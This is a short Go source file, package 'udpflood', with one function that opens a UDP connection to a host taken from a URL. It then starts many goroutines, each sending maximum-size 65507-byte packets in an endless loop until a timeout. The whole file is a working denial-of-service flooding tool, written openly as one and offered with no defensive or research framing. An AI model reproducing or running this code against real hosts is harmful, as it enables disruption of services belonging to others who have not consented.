package udpflood

import (
	"fmt"
	"net"
	"net/url"
	"time"
)

func UdpFloodUrl(host string, threadsN int64, timeout time.Duration) error {
	_url, err := url.Parse(host)
	if err != nil {
		return err
	}

	buf := make([]byte, 65507)

	//Establish udp
	conn, err := net.Dial("udp", _url.Host)
	if err != nil {
		fmt.Println(err)
	} else {
		fmt.Printf("Flooding %s\n", _url.Host)
		for i := 0; i < int(threadsN); i++ {
			go func() {
				for {
					conn.Write(buf)
				}
			}()
		}
	}

	//Sleep forever
	<-time.After(timeout)

	return nil
}
